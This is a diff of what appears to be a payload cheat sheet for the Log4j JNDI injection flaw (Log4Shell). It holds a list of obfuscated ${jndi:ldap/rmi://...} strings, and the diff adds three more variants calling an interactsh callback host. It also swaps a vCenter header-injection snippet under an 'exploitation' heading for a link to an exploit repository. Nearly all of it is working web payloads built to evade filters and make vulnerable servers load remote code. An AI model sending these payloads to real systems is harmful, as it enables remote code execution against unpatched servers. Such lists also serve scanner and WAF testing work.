@@ -8,6 +8,9 @@ ${jndi:ldap://127.0.0.1:1389/ badClassName}
 ${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
 ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
+${${aaa:bbb:-j}ndi:rmi://{{interactsh-url}}/poc}
+${${:::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
+${${:p:q::zz::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
 ${jndi:rmi://adsasd.asdasd.asdasd}
 ${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
@@ -24,11 +27,9 @@ j${::-nD}i${::-:}
 j${EnV:K5:-nD}i: 
 j${loWer:Nd}i${uPper::}
 
-3.利用
-vcenter: 
-X-Forwarded-For: ${xx/o=tomcat}
 
-User-Agent: 
+3.利用
+https://github.com/cckuailong/reapoc/tree/main/Topic/Log4j
 
 
 ```
